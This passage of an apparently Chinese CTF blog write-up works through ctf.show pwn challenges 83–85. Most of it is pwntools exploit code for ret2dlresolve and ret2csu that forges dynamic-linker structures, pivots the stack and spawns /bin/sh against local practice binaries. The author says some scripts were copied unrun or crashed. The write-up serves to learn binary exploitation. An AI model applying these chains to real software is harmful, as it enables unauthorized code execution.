6*4Byte，刚好是24</span><br><span class="line">rop.raw(write_got_addr)</span><br><span class="line">rop.raw(r_info)</span><br><span class="line">rop.raw(&#x27;a&#x27; * align)</span><br><span class="line">rop.raw(fake_dynsym_write)</span><br><span class="line">rop.raw(&#x27;write\x00&#x27;)</span><br><span class="line">rop.raw(&#x27;a&#x27; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&#x27;a&#x27; * (100 - len(rop.chain())))</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h5><p>执行shell，将write字符串修改为system字符串，再设置好参数就可以成功执行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28296&quot;)</span><br><span class="line">p = process(&quot;../pwn83&quot;)</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn83&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x6c + 0x4</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line"># 确定栈的大小为0x800</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)//2*0x10</span><br><span class="line"># 填充缓冲区和ebp</span><br><span class="line">rop.raw(cyclic(offset))</span><br><span class="line"># 调用read函数填充base_stage的区域，字节数为100</span><br><span class="line">rop.read(0,base_stage,100)</span><br><span class="line"># 栈迁移到base_stage</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">p.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line"># 发送填充到base_stage的内容</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line"># 获得plt的首地址</span><br><span class="line">plt_addr = elf.get_section_by_name(&quot;.plt&quot;).header.sh_addr</span><br><span class="line"># 获取.rel.plt的位置</span><br><span class="line">rel_plt_addr = elf.get_section_by_name(&quot;.rel.plt&quot;).header.sh_addr</span><br><span class="line"># 获取.dynsym的位置</span><br><span class="line">dynsym_addr = elf.get_section_by_name(&quot;.dynsym&quot;).header.sh_addr</span><br><span class="line"># 获取.dynstr的位置</span><br><span class="line">dynstr_addr = elf.get_section_by_name(&quot;.dynstr&quot;).header.sh_addr</span><br><span class="line"># 获取got中write的地址</span><br><span class="line">write_got_addr = elf.got[&quot;write&quot;]</span><br><span class="line"># 定义sh</span><br><span class="line">sh = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"></span><br><span class="line"># 定义fake_dynsym的位置为base_stage + 32</span><br><span class="line">fake_dynsym_addr = base_stage + 32</span><br><span class="line"></span><br><span class="line"># 将fake_dynsym和dynsym的地址进行对齐，就比如说原来的dynsym的地址是0x080481cc，以c结尾，那么fake_dynsym的地址也应该以c结尾，而base_stage + 32不一定是c结尾的，所以需要对fake_dynsym进行对齐</span><br><span class="line">align = 0x10 - ((fake_dynsym_addr - dynsym_addr)) &amp; 0xf</span><br><span class="line">fake_dynsym_addr = fake_dynsym_addr + align</span><br><span class="line"></span><br><span class="line"># 计算fake_dynsym在真正的dynsym中的索引，其实此处就是假设fake_dynsym是.dynsym的延伸，因此可以通过索引来指向fake_dynsym</span><br><span class="line">dynsym_index = (fake_dynsym_addr - dynsym_addr) // 0x10 </span><br><span class="line"></span><br><span class="line">#定义fake_dynstr的地址为fake_dynsym+0x10的位置</span><br><span class="line">fake_dynstr_addr = fake_dynsym_addr + 0x10</span><br><span class="line"></span><br><span class="line"># 计算st_name</span><br><span class="line">fake_st_name = fake_dynstr_addr - dynstr_addr</span><br><span class="line"></span><br><span class="line"># 修改过的fake_st_name</span><br><span class="line">fake_dynsym_write = flat([fake_st_name,0,0,0x12])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 定义fake_write_rel_plt的位置为base_stage + 24，计算fake_write_reloc_offset</span><br><span class="line">fake_write_reloc_offset = base_stage + 24 - rel_plt_addr</span><br><span class="line"># 定义r_info(根据r_info和dynsym之间的关系可以得到)</span><br><span class="line">r_info = (dynsym_index &lt;&lt; 8) | 0x7</span><br><span class="line"> </span><br><span class="line"># 调用_dl_runtime_resolve，完成对write函数的调用</span><br><span class="line">rop.raw(plt_addr)</span><br><span class="line">rop.raw(fake_write_reloc_offset)</span><br><span class="line">rop.raw(&#x27;bbbb&#x27;)</span><br><span class="line"># write的参数</span><br><span class="line">rop.raw(base_stage + 80)</span><br><span class="line">rop.raw(&#x27;bbbb&#x27;)</span><br><span class="line">rop.raw(&#x27;bbbb&#x27;)</span><br><span class="line"># 6*4Byte，刚好是24</span><br><span class="line">rop.raw(write_got_addr)</span><br><span class="line">rop.raw(r_info)</span><br><span class="line">rop.raw(&#x27;a&#x27; * align)</span><br><span class="line">rop.raw(fake_dynsym_write)</span><br><span class="line">rop.raw(&#x27;system\x00&#x27;)</span><br><span class="line">rop.raw(&#x27;a&#x27; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&#x27;a&#x27; * (100 - len(rop.chain())))</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="自动实现脚本"><a href="#自动实现脚本" class="headerlink" title="自动实现脚本"></a>自动实现脚本</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.binary = elf = ELF(&quot;./main_partial_relro_32&quot;)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=&quot;system&quot;,args=[&quot;/bin/sh&quot;])</span><br><span class="line"># pwntools will help us choose a proper addr</span><br><span class="line"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span><br><span class="line">rop.read(0,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">io = process(&quot;./main_partial_relro_32&quot;)</span><br><span class="line">io.recvuntil(&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">payload = flat(&#123;112:raw_rop,256:dlresolve.payload&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>直接从ctfwiki扒拉的，我也没跑过</p>
<h4 id="pwn84"><a href="#pwn84" class="headerlink" title="pwn84"></a>pwn84</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240831103517619.png" alt="image-20240831103517619"></p>
<p>csu，通用gadget，或者叫万能gadget，通过参数能够调用函数，将第一部分命名为gadget1，第二部分命名为gadget2，一般是先执行gadget2，通过pop指令将数据存入寄存器，再运行gadget1，可以看到有很多mov指令，将gadget1控制的寄存器参数进行mov，还有一个call函数执行了调用，然后通过jnz条件判断跳出循环，继续执行到ret指令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28296&quot;)</span><br><span class="line">p = process(&quot;../pwn84&quot;)</span><br><span class="line">rop = ROP(&quot;../pwn84&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn84&quot;)</span><br><span class="line"></span><br><span class="line"># 定义变量和函数</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = 0x400750</span><br><span class="line">csu_end_addr = 0x40076a</span><br><span class="line">leave_ret = 0x40063c</span><br><span class="line">pop_rbp_ret = 0x400588</span><br><span class="line">pop_rdi_ret = 0x400773</span><br><span class="line">def csu(rbx,rbp,r12,r13,r14,r15):</span><br><span class="line">	# 先执行gadget2</span><br><span class="line">	# rbx = 0，以正确的执行call指令</span><br><span class="line">	# rbp = 1，以通过jnz的判断跳出循环</span><br><span class="line">	# r12为要执行的函数地址</span><br><span class="line">	# r13,r14,r15就是要执行的函数的参数</span><br><span class="line">	payload = p64(csu_end_addr)</span><br><span class="line">	payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	payload += p64(csu_front_addr)</span><br><span class="line">	# 六个pop是0x30，还有一个add rsp,8，所以是0x38</span><br><span class="line">	payload += 0x38 * b&#x27;a&#x27;</span><br><span class="line">	return payload</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)</span><br><span class="line"></span><br><span class="line"># 先将伪造数据写入bss段，此时的栈空间是经过二次修改的</span><br><span class="line">stack_size = 0x1a0</span><br><span class="line">new_stack = bss_addr + 0x200</span><br><span class="line">vuln_addr = 0x400607</span><br><span class="line"></span><br><span class="line">offset = 0x70 + 0x8</span><br><span class="line">rop.raw(cyclic(offset))</span><br><span class="line"># 调用read函数</span><br><span class="line">payload1 = csu(0,1,elf.got[&#x27;read&#x27;],0,new_stack,stack_size)</span><br><span class="line">rop.raw(payload1)</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">assert(len(rop.chain())&lt;=256)</span><br><span class="line">rop.raw(&#x27;a&#x27;*(256-len(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line"></span><br><span class="line"># 构造伪造栈</span><br><span class="line">rop = ROP(&quot;../pwn84&quot;)</span><br><span class="line"># 修改.dynamic中指向.dynstr的地址</span><br><span class="line">rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,0x600988+8,8))</span><br><span class="line"># 获取dynstr的内容并修改</span><br><span class="line">dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).data()</span><br><span class="line">dynstr = dynstr.replace(b&quot;read&quot;,b&quot;system&quot;)</span><br><span class="line">rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,bss_addr,len(dynstr)))</span><br><span class="line">rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,bss_addr+len(dynstr),len(&quot;/bin/sh\x00&quot;)))</span><br><span class="line">rop.raw(0x400771)</span><br><span class="line">rop.raw(0)</span><br><span class="line">rop.raw(0)</span><br><span class="line">rop.raw(pop_rdi_ret)</span><br><span class="line">rop.raw(bss_addr + len(dynstr))</span><br><span class="line">rop.raw(0x400516)</span><br><span class="line">rop.raw(0xdeadbeef)</span><br><span class="line">rop.raw(&#x27;a&#x27;*(stack_size - len(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line"></span><br><span class="line"># 栈迁移</span><br><span class="line">rop = ROP(&#x27;../pwn84&#x27;)</span><br><span class="line">rop.raw(cyclic(offset))</span><br><span class="line">rop.migrate(new_stack)</span><br><span class="line">assert(len(rop.chain())&lt;=256)</span><br><span class="line">p.send(rop.chain() + b&#x27;a&#x27;*(256-len(rop.chain())))</span><br><span class="line"></span><br><span class="line">p.send(p64(bss_addr))</span><br><span class="line">p.send(dynstr)</span><br><span class="line">p.send(&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>照抄的ctfwiki的脚本，就是顺着脚本的写法理顺一下逻辑而已，不过很奇怪的是在我本地的环境跑崩溃了，明明都调用到posix_spawn函数了，不太理解</p>
<h4 id="pwn85"><a href="#pwn85" class="headerlink" title="pwn85"></a>pwn85</h4><p>写到这里有点忘了前面了（毕竟看了三天，先总结一下</p>
<p>对于no_relro的题目</p>
<p>1、先对.dynamic中指向.dynstr的地址进行修改，假设修改后指向的地址为fake_addr（此时的fake_addr应该在可以控制的范围内）</p>
<p>2、在fake_addr写入伪造后的.dynstr（将.dynstr拷贝下来，然后修改其中的一个函数名称为system)</p>
<p>对于partial_relro的题目</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240901211848266.png" alt="image-20240901211848266"></p>
<p>1、定义伪造好的.rel.plt表的地址，计算出新的reloc_index</p>
<p>2、定义伪造好的.dynsym表的地址，计算出新的r_info</p>
<p>3、定义伪造好的.dynstr表的地址，计算出新的st_name</p>
<p>4、填入伪造好的内容</p>
<p>在64位程序中，稍微有些变化，.rel.plt改名叫.rela.plt了</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240901214720428.png" alt="image-20240901214720428"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240901215451214.png" alt="image-20240901215451214"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240901220724874.png" alt="image-20240901220724874"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28191&quot;)</span><br><span class="line">p = process(&quot;../pwn85&quot;)</span><br><span class="line">rop = ROP(&quot;../pwn85&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn85&quot;)</span><br><span class="line"></span><br><span class="line"># 定义变量和函数</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = 0x400750</span><br><span class="line">csu_end_addr = 0x40076a</span><br><span class="line">vuln_addr = 0x400637</span><br><span class="line"></span><br><span class="line">def csu(rbx,rbp,r12,r13,r14,r15):</span><br><span class="line">	# 先执行gadget2</span><br><span class="line">	# rbx = 0，以正确的执行call指令</span><br><span class="line">	# rbp = 1，以通过jnz的判断跳出循环</span><br><span class="line">	# r12为要执行的函数地址</span><br><span class="line">	# r13,r14,r15就是要执行的函数的参数</span><br><span class="line">	payload = p64(csu_end_addr)</span><br><span class="line">	payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	payload += p64(csu_front_addr)</span><br><span class="line">	# 六个pop是0x30，还有一个add rsp,8，所以是0x38</span><br><span class="line">	payload += 0x38 * b&#x27;a&#x27;</span><br><span class="line">	return payload</span><br><span class="line"></span><br><span class="line"># resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, &quot;system&quot;,elf.got[&quot;write&quot;])</span><br><span class="line">def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):</span><br><span class="line">	plt0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addr</span><br><span class="line">	</span><br><span class="line">	rel_plt = elf.get_section_by_name(&#x27;.rela.plt&#x27;).header.sh_addr</span><br><span class="line">	relaent = elf.dynamic_value_by_tag(&#x27;DT_RELAENT&#x27;)</span><br><span class="line">	</span><br><span class="line">	dynsym = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addr</span><br><span class="line">	syment = elf.dynamic_value_by_tag(&#x27;DT_SYMENT&#x27;)</span><br><span class="line">	</span><br><span class="line">	dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addr</span><br><span class="line">	</span><br><span class="line">	# 构造.dynstr</span><br><span class="line">	func_string_addr = store_addr</span><br><span class="line">	resolve_data = func_name.encode(&#x27;utf-8&#x27;) + b&#x27;\x00&#x27;</span><br><span class="line">	</span><br><span class="line">	# 构造.dynsym</span><br><span class="line">	</span><br><span class="line">	symbol_addr = store_addr + len(resolve_data)</span><br><span class="line">	offset = symbol_addr - dynsym</span><br><span class="line">	pad = syment - offset % syment</span><br><span class="line">	symbol_addr = symbol_addr + pad</span><br><span class="line">	# 计算偏移伪造数据</span><br><span class="line">	symbol = p32(func_string_addr - dynstr) + p8(0x12) + p8(0) + p16(0) + p64(0) + p64(0)</span><br><span class="line">	symbol_index = (symbol_addr - dynsym) // 24</span><br><span class="line">	resolve_data += b&#x27;a&#x27;* pad</span><br><span class="line">	resolve_data += symbol</span><br><span class="line">	</span><br><span class="line">	# 构造.rela.plt</span><br><span class="line">	</span><br><span class="line">	reloc_addr = store_addr + len(resolve_data)</span><br><span class="line">	offset = reloc_addr - rel_plt</span><br><span class="line">	pad = relaent - offset % relaent</span><br><span class="line">	reloc_addr += pad</span><br><span class="line">	reloc_index = (reloc_addr - rel_plt) // 24</span><br><span class="line">	r_info = (symbol_index &lt;&lt; 32) | 7</span><br><span class="line">	write_reloc = p64(resolve_addr) + p64(r_info) + p64(0)</span><br><span class="line">	resolve_data += b&#x27;a&#x27; * pad</span><br><span class="line">	resolve_data += write_reloc</span><br><span class="line">	</span><br><span class="line">	resolve_call = p64(plt0) + p64(reloc_index)</span><br><span class="line">	return resolve_data, resolve_call</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)</span><br><span class="line"></span><br><span class="line">store_addr = bss_addr + 0x100</span><br><span class="line"></span><br><span class="line"># 在store_addr读取要执行的payload</span><br><span class="line"></span><br><span class="line">rop = ROP(&#x27;../pwn85&#x27;)</span><br><span class="line">offset = 0x70 + 0x8</span><br><span class="line">rop.raw(cyclic(offset))</span><br><span class="line">resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, &quot;system&quot;,elf.got[&quot;write&quot;])</span><br><span class="line">rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,store_addr,len(resolve_data)))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(b&#x27;a&#x27; * (0x100 - len(rop.chain())))</span><br><span class="line">assert(len(rop.chain())&lt;=0x100)</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(resolve_data)</span><br><span class="line"></span><br><span class="line"># 读取system函数的参数</span><br><span class="line"></span><br><span class="line">rop = ROP(&#x27;../pwn85&#x27;)</span><br><span class="line">rop.raw(cyclic(offset))</span><br><span class="line">sh = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">bin_sh_addr = store_addr + len(resolve_data)</span><br><span class="line">rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,bin_sh_addr,len(sh)))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(&#x27;a&#x27;*(0x100-len(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(sh)</span><br><span class="line"></span><br><span class="line"># 栈迁移</span><br><span class="line">rop = ROP(&#x27;../pwn85&#x27;)</span><br><span class="line">rop.raw(cyclic(offset))</span><br><span class="line">rop.raw(0x4007a3)</span><br><span class="line">rop.raw(bin_sh_addr)</span><br><span class="line">rop.raw(resolve_call)</span><br><span class="line">rop.raw(b&#x27;a&#x27;*(0x100-len(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很遗憾，程序崩溃了</p>
<p>仔细地看了一下ctfwiki，接下来的步骤大概是这样</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240901225747843.png" alt="image-20240901225747843"></p>
<p>脚本中主要是加了下面两段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># leak link_map addr</span><br><span class="line">rop = ROP(&quot;./main_partial_relro_64&quot;)</span><br><span class="line">rop.raw(offset*&#x27;a&#x27;)</span><br><span class="line">rop.raw(csu(0, 1 ,elf.got[&#x27;write&#x27;],1,0x601008,8))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">link_map_addr = u64(io.recv(8))</span><br><span class="line">print(hex(link_map_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span><br><span class="line">rop = ROP(&quot;./main_partial_relro_64&quot;)</span><br><span class="line">rop.raw(offset*&#x27;a&#x27;)</span><br><span class="line">rop.raw(csu(0, 1 ,elf.got[&#x27;read&#x27;],0,link_map_addr+0x1c8,8))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(p64(0))</span><br></pre></td></tr></table></figure>

<p>然后进行的下一步修改是</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240901230023749.png" alt="image-20240901230023749"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240901230031191.png" alt="image-20240901230031191"></p>
<p>最终版脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 